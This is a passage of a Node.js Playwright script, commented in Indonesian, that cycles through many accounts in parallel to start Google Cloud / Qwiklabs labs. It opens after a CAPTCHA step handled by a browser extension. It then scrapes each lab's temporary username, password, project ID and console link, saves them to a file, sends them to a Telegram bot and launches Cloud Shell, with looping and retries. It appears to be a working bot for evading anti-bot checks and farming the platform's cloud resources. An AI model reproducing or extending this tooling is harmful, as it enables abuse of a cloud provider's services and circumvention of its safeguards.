                            throw new Error('CAPTCHA_FAILED_BY_EXTENSION');
                        }
                    }

                } // <--- Ini penutup "if (needsCaptcha)"

                // TAMBAHKAN SATU KURUNG TUTUP DI SINI UNTUK MENUTUP "else" DARI STEP 3
            }

            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Step 5+6 — Tunggu Lab + Kredensial');
            console.log('└─────────────────────────────────────────');
            console.log('  ~ Menunggu lab berjalan & kredensial muncul...');
            let labStarted = false;

            try {
                await page.waitForFunction(() => {
                    const panel = document.querySelector('ql-lab-control-panel');
                    if (!panel)
                        return false;

                    function hasCredentials(root, depth = 0) {
                        if (!root || depth > 10)
                            return false;
                        for (const attrName of(root.host?.getAttributeNames?.() || [])) {
                            const val = root.host.getAttribute(attrName);
                            if (val && (val.includes('student-') || val.includes('qwiklabs-gcp-')))
                                return true;
                        }
                        const text = root.textContent || '';
                        if (/student-[a-z0-9]+@/.test(text) || /qwiklabs-gcp-/.test(text))
                            return true;
                        const els = root.querySelectorAll('*');
                        for (const el of els) {
                            if (el.shadowRoot && hasCredentials(el.shadowRoot, depth + 1))
                                return true;
                        }
                        return false;
                    }
                    for (const attrName of panel.getAttributeNames()) {
                        const val = panel.getAttribute(attrName);
                        if (val && (val.includes('student-') || val.includes('qwiklabs-gcp-')))
                            return true;
                    }
                    if (panel.shadowRoot && hasCredentials(panel.shadowRoot))
                        return true;

                    if (panel.shadowRoot) {
                        const allText = panel.shadowRoot.textContent || '';
                        if (allText.includes('End Lab'))
                            return true;
                        const btns = panel.shadowRoot.querySelectorAll('ql-lab-control-button, ql-button');
                        for (const btn of btns) {
                            const t = btn.shadowRoot?.textContent || btn.textContent || '';
                            if (t.includes('End Lab'))
                                return true;
                        }
                    }
                    const attr = panel.getAttribute('labcontrolbutton');
                    if (attr) {
                        try {
                            const s = JSON.parse(attr);
                            if (s.running || s.pending)
                                return true;
                            if (s.label && s.label.includes('End'))
                                return true;
                        } catch {}
                    }
                    const timer = panel.getAttribute('labtimer');
                    if (timer) {
                        try {
                            const t = JSON.parse(timer);
                            if (t.ticking || t.secondsRemaining < 3600)
                                return true;
                        } catch {}
                    }
                    return false;
                }, {
                    timeout: 180000
                });
                labStarted = true;
                console.log('  ✔ Lab siap!');
            } catch {
                const hasConsoleLink = await page.locator('a').filter({
                    hasText: 'Open Google Cloud console'
                }).isVisible().catch(() => false);
                const hasEndLab = await page.locator('text=End Lab').isVisible().catch(() => false);
                if (hasConsoleLink || hasEndLab) {
                    labStarted = true;
                    console.log('  ✔ Lab dimulai (terdeteksi dari konten halaman)!');
                } else {
                    console.log('  ✘ Tidak bisa konfirmasi lab start setelah 3 menit.');
                    await page.screenshot({
                        path: path.resolve(__dirname, "debug_start_lab.png"),
                        fullPage: true
                    });
                }
            }

            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Step 6 — Ekstraksi Kredensial');
            console.log('└─────────────────────────────────────────');
            if (labStarted) {
                console.log('  → Mengekstrak info lab...');

                const extractAll = await page.evaluate(() => {
                    function collectFromShadow(root, depth = 0) {
                        const data = {
                            texts: [],
                            links: [],
                            inputs: []
                        };
                        if (!root || depth > 10)
                            return data;

                        const anchors = root.querySelectorAll('a');
                        for (const a of anchors) {
                            if (a.href)
                                data.links.push({
                                    href: a.href,
                                    text: (a.textContent || '').trim()
                                });
                        }

                        const inputs = root.querySelectorAll('input, [contenteditable]');
                        for (const inp of inputs) {
                            const v = inp.value || inp.textContent || '';
                            if (v.trim())
                                data.inputs.push(v.trim());
                        }

                        const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
                        let node;
                        while (node = walker.nextNode()) {
                            const t = node.textContent.trim();
                            if (t.length > 0)
                                data.texts.push(t);
                        }

                        const allEls = root.querySelectorAll('*');
                        for (const el of allEls) {
                            if (el.shadowRoot) {
                                const sub = collectFromShadow(el.shadowRoot, depth + 1);
                                data.texts.push(...sub.texts);
                                data.links.push(...sub.links);
                                data.inputs.push(...sub.inputs);
                            }
                        }
                        return data;
                    }

                    const panel = document.querySelector('ql-lab-control-panel');
                    if (!panel)
                        return {
                            texts: [],
                            links: [],
                            inputs: [],
                            attrs: {}
                        };

                    const shadowData = panel.shadowRoot ? collectFromShadow(panel.shadowRoot) : {
                        texts: [],
                        links: [],
                        inputs: []
                    };

                    const pageLinks = [];
                    for (const a of document.querySelectorAll('a')) {
                        if (a.href && (a.href.includes('console.cloud.google') || a.textContent.includes('Google Cloud')))
                            pageLinks.push({
                                href: a.href,
                                text: (a.textContent || '').trim()
                            });
                    }
                    shadowData.links.push(...pageLinks);

                    const attrs = {};
                    for (const attrName of panel.getAttributeNames()) {
                        const val = panel.getAttribute(attrName);
                        if (val && val.length < 5000)
                            attrs[attrName] = val;
                    }
                    shadowData.attrs = attrs;

                    return shadowData;
                });

                let consoleLink = null;
                let username = null;
                let labPassword = null;
                let projectId = null;

                for (const link of extractAll.links) {
                    if (link.href.includes('console.cloud.google') || link.text.includes('Open Google Cloud') || link.text.includes('Google Cloud console')) {
                        consoleLink = link.href;
                        break;
                    }
                }

                const allTexts = [...extractAll.texts, ...extractAll.inputs];
                for (const t of allTexts) {
                    if (!username && /^student-/.test(t))
                        username = t.trim();
                    if (!projectId && /^qwiklabs-gcp-/.test(t))
                        projectId = t.trim();
                }

                const LABEL_BLACKLIST = ['Username', 'Password', 'Project', 'Google', 'Continue', 'Authorize', 'Cancel', 'Start', 'Open', 'End', 'Get', 'Lab', 'Copy', 'Click', 'content_copy', 'content copy', 'file_copy', 'Project ID', 'Open Google Cloud console', 'Open Google Cloud Console', 'student-', 'qwiklabs-gcp-'];

                for (let i = 0; i < allTexts.length; i++) {
                    const label = allTexts[i].trim().replace(/:$/, '');
                    if (/^Password$/i.test(label)) {
                        for (let j = i + 1; j < Math.min(i + 6, allTexts.length); j++) {
                            const candidate = allTexts[j].trim();
                            if (candidate.length >= 3 && !LABEL_BLACKLIST.some(bl => candidate === bl || candidate.toLowerCase() === bl.toLowerCase() || candidate.startsWith(bl)) && !candidate.includes('student') && !candidate.includes('qwiklabs')) {
                                labPassword = candidate;
                                console.log(`  ✔ Password ditemukan via label-value (offset ${j - i}): ${labPassword}`);
                                break;
                            }
                        }
                        if (labPassword)
                            break;
                    }
                }

                if (!labPassword) {
                    for (const t of allTexts) {
                        const trimmed = t.trim();
                        if (trimmed.length >= 8 && /[A-Za-z]/.test(trimmed) && /\d/.test(trimmed) && !/\s/.test(trimmed) && !trimmed.includes('student') && !trimmed.includes('qwiklabs') && !trimmed.startsWith('http') && !LABEL_BLACKLIST.some(word => trimmed === word || trimmed.toLowerCase() === word.toLowerCase())) {
                            labPassword = trimmed;
                            console.log(`  ✔ Password ditemukan via regex fallback: ${labPassword}`);
                            break;
                        }
                    }
                }

                if (!labPassword) {
                    console.log(`  ✘ Password tidak ditemukan. Semua text nodes (${allTexts.length}):`);
                    allTexts.forEach((t, i) => console.log(`    [${i}] "${t.trim()}"`));
                }

                const isValidPassword = (val) => {
                    if (!val || typeof val !== 'string')
                        return false;
                    const v = val.trim();
                    if (v.length < 3)
                        return false;
                    if (['Username', 'Password', 'Project ID', 'Project', 'Google', 'Lab'].includes(v))
                        return false;
                    if (v.includes('student-') || v.includes('qwiklabs-gcp-'))
                        return false;
                    return true;
                };

                if (extractAll.attrs) {
                    console.log(`  → Memeriksa ${Object.keys(extractAll.attrs).length} panel attribute...`);
                    for (const [key, val] of Object.entries(extractAll.attrs)) {
                        try {
                            const parsed = JSON.parse(val);
                            if (typeof parsed === 'object' && parsed !== null) {
                                if (parsed.username && !username)
                                    username = parsed.username;
                                if (parsed.password && !labPassword && isValidPassword(parsed.password)) {
                                    labPassword = parsed.password;
                                    console.log(`  ✔ Password dari attrs.password: ${labPassword}`);
                                }
                                if (parsed.projectId && !projectId)
                                    projectId = parsed.projectId;
                                if (parsed.project_id && !projectId)
                                    projectId = parsed.project_id;
                                if (parsed.student_email && !username)
                                    username = parsed.student_email;
                                if (parsed.items && Array.isArray(parsed.items)) {
                                    for (const item of parsed.items) {
                                        if (item.key === 'username' || item.label === 'Username')
                                            username = username || item.value;
                                        if ((item.key === 'password' || item.label === 'Password') && isValidPassword(item.value))
                                            labPassword = labPassword || item.value;
                                        if (item.key === 'project_id' || item.label === 'Project ID')
                                            projectId = projectId || item.value;
                                    }
                                }
                            }
                        } catch {}
                    }
                }

                console.log(`\n  ┌─ Hasil Ekstraksi ──────────────────────`);
                console.log(`  │  Console Link : ${consoleLink || 'tidak ditemukan'}`);
                console.log(`  │  Username     : ${username || 'tidak ditemukan'}`);
                console.log(`  │  Password     : ${labPassword || 'tidak ditemukan'}`);
                console.log(`  │  Project ID   : ${projectId || 'tidak ditemukan'}`);
                console.log(`  └────────────────────────────────────────`);

                const resultLines = [
`=== Lab Results ===${new Date().toLocaleString('id-ID', {
                        timeZone: 'Asia/Jakarta'
                    })}===`,
                    `Console Link: ${consoleLink || 'not found'}`, 
                    `Username: ${username || 'not found'}`, 
                    `Password: ${labPassword || 'not found'}`, 
                    `Project ID: ${projectId || 'not found'}`, 
`Lab URL: ${page.url()}`,
                    '',
                ];
                const resultPath = path.resolve(__dirname, 'result.txt');
                fs.appendFileSync(resultPath, resultLines.join('\n') + '\n', 'utf-8');
                console.log('  ✔ Hasil disimpan ke result.txt');

                if (consoleLink) {
                    const linkPath = path.resolve(__dirname, 'link.txt');
                    fs.writeFileSync(linkPath, consoleLink + '\n', 'utf-8');
                    console.log('  ✔ Console link ditulis ke link.txt');
                }

                let msg = '✅ <b>Lab Started Successfully!</b>\n\n';
                msg += `⏱ Lab is running\n`;
                if (consoleLink)
                    msg += `\n🔗 <b>Console Link:</b>\n<code>${consoleLink}</code>\n`;
                if (username)
                    msg += `\n👤 <b>Username:</b>\n<code>${username}</code>\n`;
                if (labPassword)
                    msg += `\n🔑 <b>Password:</b>\n<code>${labPassword}</code>\n`;
                if (projectId)
                    msg += `\n📁 <b>Project ID:</b>\n<code>${projectId}</code>\n`;

                await tgSendMessage(msg);
                console.log('  ✔ Info lab dikirim ke Telegram!');

                if (consoleLink) {
                    await runCloudShell(context, consoleLink, password, projectId, username, labPassword);
                } else {
                    console.log('  ✘ consoleLink tidak ditemukan, skip Cloud Shell.');
                }
            }

            console.log('\n┌─────────────────────────────────────────');
            console.log(`│  Selesai! (${label})`);
            console.log('└─────────────────────────────────────────');
            console.log(`  ✔ URL akhir: ${page.url()}`);

            await new Promise(r => setTimeout(r, 1000));
            return true;
        } catch (err) {
            console.error(`  ✘ Error [${email}]:`, err.message);
            const screenshotPath = path.resolve(__dirname, `error_${email.split('@')[0]}.png`);
            await page.screenshot({
                path: screenshotPath,
                fullPage: true
            }).catch(() => {});
            console.error(`  ⬡ Screenshot disimpan: ${screenshotPath}`);
            return false;
        } finally {
            await context.close();
            console.log(`  ✔ Browser ditutup untuk ${email}`);
        }
    }

    let loopCount = 0;
    while (loopCount < maxLoops) {
        loopCount++;
        const loopLabel = maxLoops === Infinity ? `Loop ke-${loopCount}` : `Loop ${loopCount}/${maxLoops}`;
        console.log(`\n${'█'.repeat(50)}`);
        console.log(`  🔁 ${loopLabel} — ${selected.length} akun, ${threads} thread`);
        console.log(`${'█'.repeat(50)}`);

        const failedAccounts = [];

        for (let i = 0; i < selected.length; i += threads) {
            const chunk = selected.slice(i, i + threads);
            console.log(`\n  → Batch ${Math.floor(i / threads) + 1}: ${chunk.map(a => a.email).join(', ')}`);
            const results = await Promise.all(
                    chunk.map((acc, j) => processAccount(acc, `Akun ${i + j + 1}/${selected.length} [${loopLabel}]`)));
            results.forEach((ok, j) => {
                if (!ok) {
                    failedAccounts.push(chunk[j]);
                    console.log(`  ⚠ ${chunk[j].email} masuk antrian retry`);
                }
            });
            if (i + threads < selected.length) {
                console.log(`\n  ⏳ Jeda 5 detik sebelum batch berikutnya...`);
                await new Promise(r => setTimeout(r, 5000));
            }
        }

        if (failedAccounts.length > 0) {
            console.log(`\n${'═'.repeat(50)}`);
            console.log(`  🔄 RETRY: ${failedAccounts.length} akun gagal...`);
            console.log(`${'═'.repeat(50)}`);
            await tgSendMessage(`🔄 Retry ${failedAccounts.length} akun: ${failedAccounts.map(a => a.email).join(', ')}`);
            for (let i = 0; i < failedAccounts.length; i++) {
                console.log(`\n  ⏳ Jeda 10 detik sebelum retry...`);
                await new Promise(r => setTimeout(r, 10000));
                const ok = await processAccount(failedAccounts[i], `Retry ${i + 1}/${failedAccounts.length} [${loopLabel}]`);
                if (ok) {
                    console.log(`  ✔ Retry berhasil: ${failedAccounts[i].email}`);
                } else {
                    console.log(`  ✘ Retry gagal: ${failedAccounts[i].email} — skip.`);
                    await tgSendMessage(`❌ ${failedAccounts[i].email} gagal setelah retry, skip.`);
                }
            }
        }

        if (loopCount < maxLoops) {
            console.log(`\n  ⏳ Jeda 5 detik sebelum loop berikutnya...`);
            await new Promise(r => setTimeout(r, 5000));
        }
    }

    console.log('\n  ✔ Semua loop selesai diproses.');
})();
